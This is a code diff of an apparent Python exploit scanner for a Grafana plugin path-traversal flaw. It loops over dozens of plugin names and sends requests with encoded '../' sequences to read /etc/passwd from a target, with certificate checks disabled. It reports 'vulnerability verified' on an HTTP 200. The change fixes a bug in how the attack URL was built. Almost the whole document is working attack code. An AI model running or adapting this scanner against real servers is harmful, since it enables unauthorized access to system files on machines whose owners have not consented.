@@ -6,15 +6,14 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 plugins=["alertmanager","grafana","loki","postgres","grafana-azure-monitor-datasource","mixed","prometheus","cloudwatch","graphite","mssql","tempo","dashboard","influxdb","mysql","testdata","elasticsearch","jaeger","opentsdb","zipkin","alertGroups","bargauge","debug","graph","live","piechart","status-history","timeseries","alertlist","candlestick","gauge","heatmap","logs","pluginlist","table","welcome","annolist","canvas","geomap","histogram","news","stat","table-old","xychart","barchart","dashlist","gettingstarted","icon","nodeGraph","state-timeline","text"]
 
 def Grafana(url):
-    
     for i in plugins:
-        url = url+'/public/plugins/'+i+'/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
+        urltest = url+'/public/plugins/'+i+'/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
         try:
-            r = requests.get(url,timeout=2,verify=False,allow_redirects=False)
-            # print("正在验证:"+url+'/public/plugins/'+i+'/../../../../../../../../../../../../../../../../../../etc/passwd')
+            r = requests.get(urltest,timeout=2,verify=False,allow_redirects=False)
+            # print("正在验证:",urltest)
             reqcode = r.status_code
             if reqcode == 200:
-                print("漏洞验证成功:",url)
+                print("漏洞验证成功:",urltest)
             else:
                 print("漏洞验证失败"+i)
         except:
